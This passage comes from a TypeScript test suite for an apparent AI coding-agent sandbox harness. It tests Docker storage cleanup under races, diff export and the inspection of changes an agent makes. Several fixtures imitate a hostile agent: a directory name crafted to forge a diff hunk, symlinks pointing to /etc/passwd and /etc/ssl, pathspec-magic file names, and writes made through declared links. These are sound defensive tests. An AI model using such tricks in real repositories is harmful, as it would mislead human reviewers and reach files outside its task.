    const data = fixture(), reused = taskFilesystemOwner(data.filesystems);
    const before = docker('volume', 'ls', '--quiet', '--filter', `label=io.codeboost.allocation=${reused.allocationId}`);
    expect(() => prepareTaskFilesystems(data.clone, { workBytes: 16 * 1024 * 1024, workInodes: 512,
      metadataBytes: 16 * 1024 * 1024, metadataInodes: 512 }, imageId, reused)).toThrow('still labels a Docker object');
    expect(docker('volume', 'ls', '--quiet', '--filter', `label=io.codeboost.allocation=${reused.allocationId}`)).toBe(before);
  }, 60_000);

  // A docker wrapper that hands a command matching `prefix` to `script`: a script body with `args` and `run` in scope
  // that must set `result` (it may edit `args` first, run it, act as a concurrent process, or kill the client).
  const withDockerShim = async <T>(prefix: string[], script: string, run: () => Promise<T> | T): Promise<T> => {
    const shim = mkdtempSync(join(tmpdir(), 'codeboost-shim-docker-')); roots.push(shim);
    mkdirSync(join(shim, 'input')); // afterAll resets this path's mode
    const realDocker = execFileSync('sh', ['-c', 'command -v docker'], { encoding: 'utf8' }).trim();
    writeFileSync(join(shim, 'docker'), [`#!${process.execPath}`,
      "const { spawnSync } = require('node:child_process');",
      'const args = process.argv.slice(2);',
      `const run = rest => spawnSync(${JSON.stringify(realDocker)}, rest, { encoding: 'utf8' });`,
      `if (!${JSON.stringify(prefix)}.every((word, i) => args[i] === word)) {`,
      `  process.exit(spawnSync(${JSON.stringify(realDocker)}, args, { stdio: 'inherit' }).status ?? 1); }`,
      'let result;',
      script,
      'process.stdout.write(result.stdout); process.stderr.write(result.stderr); process.exit(result.status ?? 1);',
    ].join('\n'), { mode: 0o755 });
    const path = process.env.PATH;
    process.env.PATH = `${shim}:${path}`;
    try { return await run(); } finally { process.env.PATH = path; }
  };
  // After our create, another process creates a volume carrying the same allocation ID: both passed the check first.
  const racer = (name: string) => [
    'result = run(args);',
    "const allocation = args.find(arg => arg.startsWith('io.codeboost.allocation='));",
    `run(['volume', 'create', '--label', 'io.codeboost.runner=${'f'.repeat(32)}', '--label', allocation, '${name}']);`,
  ].join('\n');
  const byAllocation = (allocationId: string) => ['volume', 'network'].flatMap(kind => docker(kind, 'ls', '--quiet',
    '--filter', `label=io.codeboost.allocation=${allocationId}`).split('\n').filter(Boolean))
    .concat(docker('ps', '--all', '--quiet', '--filter', `label=io.codeboost.allocation=${allocationId}`).split('\n')
      .filter(Boolean));

  it('backs out of task storage when a concurrent process claims the same allocation ID', async () => {
    const data = fixture(), owner = testOwner('storage-race'), rival = `codeboost-race-${randomUUID()}`;
    try {
      await withDockerShim(['volume', 'create'], racer(rival), () => expect(() => prepareTaskFilesystems(data.clone,
        { workBytes: 16 * 1024 * 1024, workInodes: 512, metadataBytes: 16 * 1024 * 1024, metadataInodes: 512 },
        imageId, owner)).toThrow('still labels a Docker object'));
      expect(byAllocation(owner.allocationId)).toEqual([rival]);
    } finally { spawnSync('docker', ['volume', 'rm', '--force', rival], { stdio: 'ignore' }); }
  }, 60_000);

  it('backs out of a vendor network when a concurrent process claims the same allocation ID', async () => {
    const data = fixture(), allocationId = randomUUID(), rival = `codeboost-race-${randomUUID()}`;
    try {
      await withDockerShim(['network', 'create'], racer(rival), () => expect(createVendorNetwork(
        invocation(data.clone, 'planning'), imageId, allocationId)).rejects.toThrow('still labels a Docker object'));
      expect(byAllocation(allocationId)).toEqual([rival]);
    } finally { spawnSync('docker', ['volume', 'rm', '--force', rival], { stdio: 'ignore' }); }
  }, 60_000);

  it('never removes a network found by name after a killed create when its runner label differs', async () => {
    const data = fixture(), allocationId = randomUUID();
    // The create lands with another runner's label, and its client is killed before it reports the ID.
    const foreign = [
      `const at = args.findIndex(arg => arg.startsWith('io.codeboost.runner='));`,
      `args[at] = 'io.codeboost.runner=${'f'.repeat(32)}';`,
      'result = run(args);',
      "process.kill(process.pid, 'SIGKILL');",
    ].join('\n');
    const created = await withDockerShim(['network', 'create'], foreign, () =>
      createVendorNetwork(invocation(data.clone, 'planning'), imageId, allocationId).then(() => undefined, error => error));
    const left = docker('network', 'ls', '--quiet', '--filter', `label=io.codeboost.allocation=${allocationId}`);
    try {
      expect(created).toBeInstanceOf(VendorNetworkCreationCleanupError);
      const cleanup = (created as VendorNetworkCreationCleanupError).errors[1] as AggregateError;
      expect(cleanup.errors.map(error => (error as Error).message)).toEqual(['Refused to remove unowned vendor network.']);
      expect(left).not.toBe('');
    } finally { if (left) spawnSync('docker', ['network', 'rm', ...left.split('\n')], { stdio: 'ignore' }); }
  }, 60_000);

  it('never removes an agent container found by name after a killed create when a label is missing', async () => {
    const data = fixture(), live = await profile(data, 'planning', 'must-not-run');
    // The create lands without the runner label, and its client is killed before it reports the ID.
    const unlabelled = [
      "const at = args.findIndex(arg => arg.startsWith('io.codeboost.runner='));",
      'args.splice(at - 1, 2);',
      'result = run(args);',
      "process.kill(process.pid, 'SIGKILL');",
    ].join('\n');
    try {
      await withDockerShim(['create', '--name'], unlabelled, () =>
        expect(createValidatedContainer(live)).rejects.toThrow('cleanup did not settle'));
      expect(docker('container', 'inspect', '--format', '{{index .Config.Labels "io.codeboost.invocation"}}', live.name))
        .toBe(live.ownershipId);
    } finally { spawnSync('docker', ['rm', '--force', live.name], { stdio: 'ignore' }); }
  }, 60_000);

  it('removes a task keeper by the ID it inspected, never a same-named replacement created after the inspect', async () => {
    const data = fixture(), filesystems = data.filesystems, swapped = join(data.root, 'swapped');
    taskFilesystems.splice(taskFilesystems.indexOf(filesystems), 1);
    // Right after cleanup inspects the keeper, its name is taken over by another container.
    const swap = [
      'result = run(args);',
      `if (args[2] === ${JSON.stringify(filesystems.keeper)} && !require('node:fs').existsSync(${JSON.stringify(swapped)})) {`,
      `  require('node:fs').writeFileSync(${JSON.stringify(swapped)}, '');`,
      `  run(['rm', '--force', args[2]]);`,
      `  run(['run', '--detach', '--name', args[2], '--network=none', '--entrypoint', 'sleep', ${JSON.stringify(imageId)}, 'infinity']);`,
      '}',
    ].join('\n');
    try {
      await withDockerShim(['container', 'inspect'], swap, () => removeTaskFilesystems(filesystems));
      expect(docker('container', 'inspect', '--format', '{{.State.Running}}', filesystems.keeper)).toBe('true');
    } finally { spawnSync('docker', ['rm', '--force', filesystems.keeper], { stdio: 'ignore' }); }
  }, 60_000);

  it('removes an agent container by its captured ID even when validation refused its invocation label', async () => {
    const data = fixture(), live = await profile(data, 'planning', 'must-not-run');
    // The create lands with the wrong invocation label but reports its ID, so the ID alone proves it is ours.
    const mislabelled = [
      "const at = args.findIndex(arg => arg.startsWith('io.codeboost.invocation='));",
      "args[at] = 'io.codeboost.invocation=someone-else';",
      'result = run(args);',
    ].join('\n');
    try {
      await withDockerShim(['create', '--name'], mislabelled, () =>
        expect(createValidatedContainer(live)).rejects.toThrow('lockdown'));
      expect(spawnSync('docker', ['container', 'inspect', live.name]).status).not.toBe(0);
    } finally { spawnSync('docker', ['rm', '--force', live.name], { stdio: 'ignore' }); }
  }, 60_000);

  it('releases a network allocation claim once a failed setup cleanup is retried successfully', async () => {
    const data = fixture(), allocationId = randomUUID(), marker = join(data.root, 'network-rm-failed');
    // The proxy create is refused, and the first network removal fails, so setup cleanup does not settle.
    const failing = [
      "if (args[0] === 'create' && args[1] === '--name') result = { status: 1, stdout: '', stderr: 'refused' };",
      `else if (args[0] === 'network' && args[1] === 'rm' && !require('node:fs').existsSync(${JSON.stringify(marker)})) {`,
      `  require('node:fs').writeFileSync(${JSON.stringify(marker)}, ''); result = { status: 1, stdout: '', stderr: 'busy' }; }`,
      'else result = run(args);',
    ].join('\n');
    const failed = await withDockerShim([], failing, () =>
      createVendorNetwork(invocation(data.clone, 'planning'), imageId, allocationId).then(() => undefined, error => error));
    expect(failed).toBeInstanceOf(VendorNetworkCreationCleanupError);
    await (failed as VendorNetworkCreationCleanupError).retryCleanup();
    // Nothing carries the ID any more, and the claim is released, so the ID is usable again.
    const again = await createVendorNetwork(invocation(data.clone, 'planning'), imageId, allocationId);
    vendorNetworks.push(again);
  }, 120_000);

  const storageLimits = { workBytes: 16 * 1024 * 1024, workInodes: 512, metadataBytes: 16 * 1024 * 1024,
    metadataInodes: 512 };

  it('removes a keeper that was created but failed to start, and the volumes it holds', async () => {
    const data = fixture(), owner = testOwner('keeper-start');
    const refuseStart = "result = { status: 1, stdout: '', stderr: 'OCI runtime start failed' };";
    await withDockerShim(['start'], refuseStart, () =>
      expect(() => prepareTaskFilesystems(data.clone, storageLimits, imageId, owner)).toThrow('docker start'));
    expect(byAllocation(owner.allocationId)).toEqual([]);
  }, 60_000);

  it('removes a seeder that docker run created but could not start, and the volumes it holds', async () => {
    const data = fixture(), owner = testOwner('seeder-start');
    // The daemon creates the seeder, then answers the run with a start failure.
    const createOnly = [
      "run(['create', ...args.slice(1)]);",
      "result = { status: 125, stdout: '', stderr: 'OCI runtime create failed' };",
    ].join('\n');
    await withDockerShim(['run', '--rm'], createOnly, () =>
      expect(() => prepareTaskFilesystems(data.clone, storageLimits, imageId, owner)).toThrow('docker run'));
    expect(byAllocation(owner.allocationId)).toEqual([]);
  }, 60_000);

  it('aborts storage allocation while a Docker call ignores SIGTERM, and removes what it created before settling', async () => {
    const data = fixture(), owner = testOwner('abort-allocation'), marker = join(data.root, 'start-began');
    // The keeper really starts, then the client ignores SIGTERM and never returns.
    const stubborn = [
      'result = run(args);',
      `require('node:fs').writeFileSync(${JSON.stringify(marker)}, '');`,
      "process.on('SIGTERM', () => {});",
      'Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0);',
    ].join('\n');
    const controller = new AbortController(), pgids: number[] = [];
    const waitForStart = setInterval(() => { if (existsSync(marker)) controller.abort(); }, 20);
    const began = performance.now();
    try {
      await withDockerShim(['start'], stubborn, () => expect(prepareTaskFilesystemsAsync(data.clone, storageLimits,
        imageId, owner, { signal: controller.signal, onProcessGroup: group => { pgids.push(group.pgid); } }))
        .rejects.toThrow('cancelled'));
    } finally { clearInterval(waitForStart); }
    expect(performance.now() - began).toBeGreaterThanOrEqual(5_000);
    expect(byAllocation(owner.allocationId)).toEqual([]);
    // process.kill with a negative ID signals the group; the kill utility would read "-<pgid>" as an option.
    const groupAlive = (pgid: number) => { try { process.kill(-pgid, 0); return true; } catch { return false; } };
    for (const pgid of pgids) expect(groupAlive(pgid)).toBe(false);
  }, 90_000);

  // What an agent leaves in task storage: a commit of its own, an edit to a tracked file, a staged-only file, a binary
  // file, a new untracked file and an untracked nested repository. `extra` runs last, as the same user.
  const agentChanges = (filesystems: ReturnType<typeof prepareTaskFilesystems>, extra = 'true') => docker('run', '--rm', '--network=none',
    '--user', '10001:10001', '--tmpfs', '/tmp', '--env', 'HOME=/tmp',
    '--mount', `type=volume,source=${filesystems.workVolume},target=/work`,
    '--mount', `type=volume,source=${filesystems.metadataVolume},target=/work/.git`, '--entrypoint', 'bash', imageId, '-c', [
      'set -e', 'cd /work',
      'g() { git -c user.name=agent -c user.email=agent@example.com -c core.hooksPath=/dev/null "$@"; }',
      'printf "committed\\n" > committed.txt', 'g add committed.txt', 'g commit -qm agent',
      'printf "changed\\n" > file.txt', 'printf "staged only\\n" > staged.txt', 'g add staged.txt',
      'printf "\\000\\377\\001" > binary.dat', 'printf "brand new\\n" > untracked.txt',
      'mkdir nested', '(cd nested && git init -q)', 'mkdir linked-dir', 'ln -s linked-dir dir-link',
      // A tracked directory replaced by a link to /etc/ssl, whose private/ this user cannot read. What is behind the
      // link is not the task's: its files are deleted, and Git's warnings about /etc/ssl/private must not fail the export.
      'mkdir -p ssl/private', 'printf "cert\\n" > ssl/cert.pem', 'printf "key\\n" > ssl/private/key.pem',
      'g add ssl', 'g commit -qm ssl', 'rm -rf ssl', 'ln -s /etc/ssl ssl',
      // Ordinary line-ending attributes make Git warn about these files; a warning must not fail the export.
      'printf "* text=auto\\n*.bat text eol=crlf\\n" > .gitattributes', 'printf "a\\r\\nb\\r\\n" > crlf.txt',
      'printf "x\\n" > unix.bat',
      // Warnings about the agent's own attribute and ignore files must not fail the export either.
      'printf "!ignored text\\n" >> .gitattributes', 'mkdir -p tools', 'printf "*.log\\n" > tools/gitignore',
      'ln -s tools/gitignore .gitignore',
      'printf "enc.txt working-tree-encoding=UTF-16\\n" >> .gitattributes', 'printf "plain\\n" > enc.txt',
      'printf "dash content\\n" > ./-', 'printf "after dash\\n" > z-after.txt',
      // Names Git refuses or guards on Windows: one it will never add, and two ordinary on Linux.
      'mkdir .GIT', 'printf "reserved\\n" > .GIT/f', 'printf "short\\n" > GIT~1', 'mkdir x', 'printf "spaced\\n" > "x/.git "',
      'ln -s target x/.GitModules',
      // Folders whose names contain words from Git's read-failure messages, with attribute lines Git warns about.
      'mkdir "could not open" "x Permission denied"', 'printf "* -bad!name\\n" > "could not open/.gitattributes"',
      'printf "* -bad!name\\n" > "x Permission denied/.gitattributes"', 'printf "kept\\n" > "could not open/f"',
      // A nested repository whose name tries to forge a hunk for another file.
      'forged=$(printf "evil\\n+++ b/file.txt\\n@@ -1 +1 @@\\n+forged")', 'mkdir -p "$forged"', '(cd "$forged" && git init -q)',
      extra].join('\n'));
  // Every file and directory in both volumes, with its metadata and contents, read without writing.
  const storageSnapshot = (filesystems: ReturnType<typeof prepareTaskFilesystems>) => docker('run', '--rm',
    '--network=none', '--user', '10001:10001',
    '--mount', `type=volume,source=${filesystems.workVolume},target=/work,readonly`,
    '--mount', `type=volume,source=${filesystems.metadataVolume},target=/work/.git,readonly`, '--entrypoint', 'bash',
    imageId, '-c', 'cd /work && find . -printf "%p %m %s %T@\\n" | sort && find . -type f -readable -print0 | sort -z | xargs -0 sha256sum');

  it('exports the diff against the last codeboost commit, bounded and without writing to the storage', async () => {
    const data = fixture(), filesystems = data.filesystems;
    agentChanges(filesystems);
    const before = storageSnapshot(filesystems);
    const exported = await exportTaskDiff(filesystems, { base: data.clone.head, imageId });
    expect(storageSnapshot(filesystems)).toBe(before);
    const text = exported.diff.toString('utf8');
    expect(exported.truncated).toBe(false);
    expect(text).toContain('+staged only');
    expect(text).toContain('b/binary.dat');
    expect(text).toContain('GIT binary patch');
    expect(text).toContain('untracked directory nested/ is a nested repository');
    // A symlink is diffed as the link it is, not followed or mistaken for a nested repository.
    expect(text).toContain('b/dir-link');
    expect(text).toContain('new file mode 120000');
    expect(text).not.toContain('dir-link is a nested repository');
    // A file named "-" is a name, not standard input, and the files after it are still exported.
    expect(text).toContain('+dash content');
    expect(text).toContain('+after dash');
    expect(text).toContain('b/could not open/f');
    expect(text).toContain('codeboost: untracked .GIT/f is a name Git will not add');
    expect(text).toContain('codeboost: untracked x/.GitModules is a name Git will not add');
    expect(text).toContain('+short');
    expect(text).toContain('+spaced');
    // The hostile name stays on one quoted line: no forged hunk line appears.
    expect(text).not.toMatch(/^\+forged$/m);
    expect(text).toMatch(/untracked directory \$'evil\\n.*is a nested repository/);
    // The agent's own commit, an unstaged edit and an untracked file all appear against the base.
    expect(text).toContain('b/committed.txt');
    expect(text).toContain('+committed');
    expect(text).toContain('-trusted');
    expect(text).toContain('+changed');
    expect(text).toContain('b/untracked.txt');
    expect(text).toContain('+brand new');
    expect(text).toContain('b/ssl');
    expect(text).toContain('b/crlf.txt');
    expect(text).toContain('b/unix.bat');
    expect(text).toContain('b/enc.txt');
    const cut = await exportTaskDiff(filesystems, { base: data.clone.head, imageId, maxBytes: 20 });
    expect(cut).toEqual({ diff: exported.diff.subarray(0, 20), truncated: true });
    await expect(exportTaskDiff(filesystems, { base: 'c'.repeat(40), imageId })).rejects.toThrow('is not a commit');
    // A Git failure part-way through fails the export; it is never passed off as a complete diff.
    // Anything the export cannot read fails it: Git would otherwise drop untracked files or show tracked ones as deleted.
    for (const extra of ['printf "secret\\n" > unreadable.txt && chmod 000 unreadable.txt',
      'mkdir hidden && printf "x\\n" > hidden/untracked.txt && chmod 000 hidden',
      'mkdir tracked && printf "a\\n" > tracked/f && g add tracked/f && g commit -qm tracked && printf "b\\n" > tracked/f && chmod 000 tracked',
      // An ignored directory: the untracked scan never enters it, so Git would report its tracked file as deleted.
      'mkdir -p .git/info && printf "gone/\\n" >> .git/info/exclude && mkdir gone && printf "a\\n" > gone/f && g add -f gone/f && g commit -qm gone && chmod 000 gone']) {
      const failing = fixture();
      agentChanges(failing.filesystems, extra);
      await expect(exportTaskDiff(failing.filesystems, { base: failing.clone.head, imageId })).rejects.toThrow('could not read part of the task worktree');
    }
    // No export container is left, and the storage still validates for the next launch.
    expect(docker('ps', '--all', '--quiet', '--filter', 'label=io.codeboost.task-storage=export',
      '--filter', `label=io.codeboost.allocation=${taskFilesystemOwner(filesystems).allocationId}`)).toBe('');
  }, 120_000);

  it('exports freshly seeded storage without treating every tracked file as changed', async () => {
    // A large tracked file the agent never touches, and an edit made without Git, as an agent that never commits
    // leaves it: nothing refreshes the index after seeding except the seeder itself.
    const data = fixture({ limits: { workBytes: 48 * 1024 * 1024, workInodes: 512, metadataBytes: 48 * 1024 * 1024,
      metadataInodes: 512 }, hostile: source => writeFileSync(join(source, 'untouched-big.bin'), randomBytes(9 * 1024 * 1024)) });
    docker('run', '--rm', '--network=none', '--user', '10001:10001',
      '--mount', `type=volume,source=${data.filesystems.workVolume},target=/work`, '--entrypoint', 'sh', imageId, '-c',
      'printf "edited\\n" > /work/file.txt');
    const text = (await exportTaskDiff(data.filesystems, { base: data.clone.head, imageId })).diff.toString('utf8');
    expect(text).toContain('+edited');
    expect(text).not.toContain('untouched-big.bin');
  }, 180_000);

  it('names every entry Git would skip without a word, instead of dropping what is inside', async () => {
    const data = fixture();
    agentChanges(data.filesystems, [
      // A tracked directory that becomes a repository: Git no longer looks for new files in it.
      'mkdir src && printf "a\\n" > src/a.txt && g add src && g commit -qm src',
      '(cd src && git init -q) && printf "new\\n" > src/new.txt',
      // Something named .git that is not a repository: Git never lists it or anything inside.
      'mkdir -p out/.git && printf "payload\\n" > out/.git/payload',
      'mkfifo pipe',
      // A directory that ignores itself: Git lists it and its contents, and it is named once.
      'mkdir gen && printf "*\\n" > gen/.gitignore && printf "important\\n" > gen/code.py',
      // A clone made on a case-insensitive host (macOS) records core.ignorecase=true; the work volume is case-sensitive,
      // and with it Git would take .GIT for .git and FILE.txt for the tracked file.txt, and drop both.
      'g config core.ignorecase true && printf "upper\\n" > FILE.txt'].join(' && '));
    const text = (await exportTaskDiff(data.filesystems, { base: data.clone.head, imageId })).diff.toString('utf8');
    expect(text).toContain('codeboost: src/.git is a .git entry, which Git skips');
    expect(text).toContain('codeboost: out/.git is a .git entry, which Git skips');
    expect(text).toContain('codeboost: pipe is a fifo or socket; it is not exported');
    expect(text).toMatch(/^codeboost: untracked gen\/ is ignored; it is not exported$/m);
    expect(text).not.toContain('gen/code.py');
    expect(text).toContain('codeboost: untracked .GIT/f is a name Git will not add');
    expect(text).toContain('+upper');
    // Covered as a whole already: the untracked nested repository's own .git is not named again.
    expect(text).toContain('untracked directory nested/ is a nested repository');
    expect(text).not.toContain('nested/.git');
  }, 120_000);

  // An agent's own writes, mounted as every agent container mounts task storage: the work tree writable, the metadata
  // read-only.
  const asAgent = (filesystems: ReturnType<typeof prepareTaskFilesystems>, script: string) => docker('run', '--rm',
    '--network=none', '--user', '10001:10001', '--tmpfs', '/tmp', '--env', 'HOME=/tmp',
    '--mount', `type=volume,source=${filesystems.workVolume},target=/work`,
    '--mount', `type=volume,source=${filesystems.metadataVolume},target=/work/.git,readonly`,
    '--entrypoint', 'bash', imageId, '-c', `set -e; cd /work; ${script}`);

  describe('change inspection (#66)', () => {
    it('reports nothing for untouched storage, and the metadata baseline survives an export and an agent\'s Git', async () => {
      const data = fixture();
      const linkSnapshot = await snapshotDeclaredLinks(data.filesystems, [], { imageId });
      expect(data.filesystems.metadataBaseline).toMatch(/^[0-9a-f]{64}$/);
      await exportTaskDiff(data.filesystems, { base: data.clone.head, imageId });
      asAgent(data.filesystems, 'git status >/dev/null && git log -1 >/dev/null');
      const manifest = await inspectTaskChanges(data.filesystems, { base: data.clone.head, linkSnapshot, imageId });
      expect(manifest).toMatchObject({ base: data.clone.head, changes: [], agentCommits: [], metadataChanged: false,
        linkTargetChanges: [], nestedGitlinkContent: [] });
      expect(manifest.digest).toBe(manifestDigest(manifest));
    }, 180_000);

    it('reports a new symlink, and writes through declared links to a file, a directory child and a dangling target', async () => {
      const data = fixture({ hostile: source => {
        mkdirSync(join(source, 'd'));
        for (const [name, text] of [['d/t.txt', 't'], ['q.txt', 'q'], ['r.txt', 'r']] as const) writeFileSync(join(source, name), `${text}\n`);
        for (const [link, target] of [['link', 'd/t.txt'], ['dlink', 'd'], ['dang', 'gone'], ['quiet', 'q.txt'],
          ['rewrite', 'r.txt'], ['still', 'missing'], ['moved', 'q.txt']] as const) symlinkSync(target, join(source, link));
      } });
      const linkSnapshot = await snapshotDeclaredLinks(data.filesystems,
        ['link', 'dlink', 'dang', 'quiet', 'rewrite', 'still', 'moved', 'file.txt'], { imageId });
      expect(linkSnapshot.links.map(link => [link.link, link.status, link.target])).toEqual([
        ['link', 'present', 'd/t.txt'], ['dlink', 'present', 'd'], ['dang', 'absent', 'gone'], ['quiet', 'present', 'q.txt'],
        ['rewrite', 'present', 'r.txt'], ['still', 'absent', 'missing'], ['moved', 'present', 'q.txt'],
        ['file.txt', 'not-a-link', undefined]]);
      asAgent(data.filesystems, [
        'printf "through\\n" > link', 'printf "child\\n" > dlink/new.txt', 'printf "made\\n" > dang',
        // The same bytes written again: nothing to diff, but still a write through the link.
        'printf "r\\n" > rewrite', 'ln -s /etc/passwd newlink',
        // A new file beside the still-dangling target, in the directory above it: not a write through the link.
        'printf "sibling\\n" > beside.txt',
        // Pointed elsewhere: the link itself changed.
        'ln -sfn d/t.txt moved'].join(' && '));
      const manifest = await inspectTaskChanges(data.filesystems, { base: data.clone.head, linkSnapshot, imageId });
      expect(manifest.linkTargetChanges).toEqual(expect.arrayContaining([
        { link: 'link', target: 'd/t.txt', path: 'd/t.txt', change: 'content' },
        { link: 'dlink', target: 'd', path: 'd/new.txt', change: 'created' },
        { link: 'dang', target: 'gone', path: 'gone', change: 'status' },
        { link: 'rewrite', target: 'r.txt', path: 'r.txt', change: 'identity' }]));
      expect(manifest.linkTargetChanges.filter(change => change.link === 'quiet')).toEqual([]);
      expect(manifest.linkTargetChanges.filter(change => change.link === 'still')).toEqual([]);
      expect(manifest.linkTargetChanges).toContainEqual({ link: 'moved', target: 'q.txt', path: 'moved', change: 'retargeted' });
      expect(manifest.changes).toEqual(expect.arrayContaining([
        expect.objectContaining({ kind: 'modify', path: 'd/t.txt' }), expect.objectContaining({ kind: 'add', path: 'd/new.txt' }),
        expect.objectContaining({ kind: 'add', path: 'gone', newType: 'file' }),
        { kind: 'add', path: 'newlink', newType: 'symlink', newMode: '120000', newOid: expect.stringMatching(/^[0-9a-f]{40}$/),
          newLinkTarget: '/etc/passwd', underGit: false, ignored: false }]));
      expect(manifest.changes.map(change => change.path)).not.toContain('r.txt');
    }, 180_000);

    it('resolves a declared link one part at a time: a link before ".." stops it, as the kernel would', async () => {
      const data = fixture({ hostile: source => {
        mkdirSync(join(source, 'd', 'e'), { recursive: true });
        writeFileSync(join(source, 'secret'), 'top\n'); writeFileSync(join(source, 'd', 'secret'), 'inner\n');
        writeFileSync(join(source, 'd', 'e', 'keep'), '');
        symlinkSync('d/e', join(source, 'a')); symlinkSync('a/../secret', join(source, 'x'));
        symlinkSync('d/e/../secret', join(source, 'y'));
        // A chain: the target is itself a link. And a directory target with a link inside it.
        symlinkSync('link2', join(source, 'chain')); symlinkSync('secret', join(source, 'link2'));
        mkdirSync(join(source, 'box')); symlinkSync('../secret', join(source, 'box', 'inner')); symlinkSync('box', join(source, 'boxlink'));
        writeFileSync(join(source, 'box', 'app.yml'), 'app\n');
        // A declared link whose target's parent the agent will remove, and one named like an option.
        mkdirSync(join(source, 'p')); writeFileSync(join(source, 'p', 'f'), 'f\n'); symlinkSync('p/f', join(source, 'pl'));
        symlinkSync('secret', join(source, '--'));
      } });
      const linkSnapshot = await snapshotDeclaredLinks(data.filesystems, ['x', 'y', 'chain', 'boxlink', 'pl', '--'], { imageId });
      // x goes through the link a (to d/e), so it reaches d/secret, not the top-level secret its text suggests.
      expect(linkSnapshot.links[0]).toMatchObject({ link: 'x', status: 'through-link', anchor: { path: 'a', type: 'symlink' } });
      expect(linkSnapshot.links[0]!.target).toBeUndefined();
      // Through real directories only, y resolves by name.
      expect(linkSnapshot.links[1]).toMatchObject({ link: 'y', status: 'present', target: 'd/secret' });
      // A write through either would land on secret, which neither target is: both stop at the link.
      expect(linkSnapshot.links[2]).toMatchObject({ link: 'chain', status: 'through-link', anchor: { path: 'link2' } });
      expect(linkSnapshot.links[3]).toMatchObject({ link: 'boxlink', status: 'through-link', target: 'box',
        anchor: { path: 'box/inner', type: 'symlink' } });
      expect(linkSnapshot.links[5]).toMatchObject({ link: '--', status: 'present', target: 'secret' });
      // Unchanged after the run: nothing to report, though inspection resolves the links without walking the targets.
      const manifest = await inspectTaskChanges(data.filesystems, { base: data.clone.head, linkSnapshot, imageId });
      expect(manifest.linkTargetChanges).toEqual([]);
      // A write elsewhere in a through-link directory target is still a change to it; a removed parent is reported.
      asAgent(data.filesystems, 'printf "EVIL\\n" > box/app.yml && rm -rf p');
      const after = await inspectTaskChanges(data.filesystems, { base: data.clone.head, linkSnapshot, imageId });
      expect(after.linkTargetChanges).toEqual(expect.arrayContaining([
        { link: 'boxlink', target: 'box', path: 'box/app.yml', change: 'content' },
        { link: 'pl', target: 'p/f', path: 'p/f', change: 'status' }]));
      expect(after.linkTargetChanges.filter(change => change.link === 'pl')).toHaveLength(1);
    }, 180_000);

    it('keeps to the work tree when the agent reshapes the path to a declared link\'s target', async () => {
      const data = fixture({ hostile: source => {
        mkdirSync(join(source, 'd', 'lib'), { recursive: true }); writeFileSync(join(source, 'd', 'lib', 'x'), 'x\n');
        symlinkSync('d/lib', join(source, 'L'));
        // Through a missing directory and back up: where that leads depends on what m becomes, so nothing is watched.
        mkdirSync(join(source, 'real')); writeFileSync(join(source, 'real', 'f'), 'f\n'); symlinkSync('real', join(source, 'via'));
        writeFileSync(join(source, 'plain'), 'p\n');
        symlinkSync('m/../via/f', join(source, 'M')); symlinkSync('m/../plain', join(source, 'P'));
        // A tracked file the agent turns into a directory.
        writeFileSync(join(source, 'docs'), 'docs\n');
      } });
      const linkSnapshot = await snapshotDeclaredLinks(data.filesystems, ['L', 'M', 'P'], { imageId });
      expect(linkSnapshot.links[0]).toMatchObject({ link: 'L', status: 'present', target: 'd/lib' });
      for (const record of linkSnapshot.links.slice(1)) {
        expect(record).toMatchObject({ status: 'absent', anchor: { path: '.' } });
        expect(record.target).toBeUndefined();
      }
      // Untouched: nothing to report for any of them.
      expect((await inspectTaskChanges(data.filesystems, { base: data.clone.head, linkSnapshot, imageId })).linkTargetChanges)
        .toEqual([]);
      asAgent(data.filesystems, 'rm -rf d && ln -s /usr d && rm docs && mkdir -p docs/api && printf "a\\n" > docs/api/x');
      // The inspection must not walk /usr through the new link: it reports the change and finishes.
      const manifest = await inspectTaskChanges(data.filesystems, { base: data.clone.head, linkSnapshot, imageId });
      expect(manifest.linkTargetChanges).toEqual(expect.arrayContaining([
        { link: 'L', target: 'd/lib', path: 'L', change: 'retargeted' },
        { link: 'L', target: 'd/lib', path: 'd/lib', change: 'status' }]));
      const byPath = new Map(manifest.changes.map(change => [change.path, change]));
      expect(byPath.get('docs')).toMatchObject({ kind: 'modify', oldType: 'file', newType: 'directory' });
      expect(byPath.get('docs/api/x')).toMatchObject({ kind: 'add' });
    }, 180_000);

    it('reports what Git would skip: ignored files and directories under base\'s rules, fifos and .git parts', async () => {
      const data = fixture({ hostile: source => {
        writeFileSync(join(source, '.gitignore'), '*.log\n/build/\n');
        mkdirSync(join(source, 'kept')); writeFileSync(join(source, 'kept', 'tracked.log'), 'tracked\n');
        git(source, 'add', '-f', 'kept/tracked.log');
      } });
      asAgent(data.filesystems, [
        'printf "x\\n" > x.log', 'mkfifo pipe', 'mkdir -p out/.git && printf "p\\n" > out/.git/payload',
        // Ignored output: one entry for the directory, whatever is inside, links included.
        'mkdir -p build/deep && printf "o\\n" > build/deep/o.bin && ln -s /etc build/deep/etc',
        // A directory holding a tracked file is never collapsed, even under an ignore rule.
        'printf "changed\\n" > kept/tracked.log && printf "n\\n" > kept/new.log',
        // The agent's own ignore rules do not count: this file is still listed as not ignored.
        'printf "*.secret\\n" >> .gitignore && printf "s\\n" > hidden.secret',
        // Names are literal, never pathspec magic: ":/build" is a directory named ":" holding "build", not the top-level
        // build that "/build/" ignores.
        'mkdir -p ":/build" && printf "e\\n" > ":/build/evil.js" && printf "g\\n" > ":(glob)x"',
        // An ignored directory is never entered, so what cannot be read inside it cannot fail the inspection.
        'mkdir -p build/locked && chmod 000 build/locked'].join(' && '));
      const manifest = await inspectTaskChanges(data.filesystems, { base: data.clone.head, imageId, linkSnapshot: { links: [] } });
      const byPath = new Map(manifest.changes.map(change => [change.path, change]));
      expect(byPath.get('x.log')).toMatchObject({ kind: 'add', newType: 'file', ignored: true });
      expect(byPath.get('pipe')).toEqual({ kind: 'add', path: 'pipe', newType: 'other', underGit: false, ignored: false });
      expect(byPath.get('out/.git/payload')).toMatchObject({ kind: 'add', underGit: true, ignored: false });
      expect(byPath.get('build')).toEqual({ kind: 'add', path: 'build', newType: 'directory', underGit: false, ignored: true });
      expect([...byPath.keys()].filter(path => path.startsWith('build/'))).toEqual([]);
      expect(byPath.get('kept/tracked.log')).toMatchObject({ kind: 'modify' });
      expect(byPath.get('kept/new.log')).toMatchObject({ kind: 'add', ignored: true });
      expect(byPath.get('hidden.secret')).toMatchObject({ kind: 'add', ignored: false });
      expect(byPath.get(':/build/evil.js')).toMatchObject({ kind: 'add', newType: 'file', ignored: false });
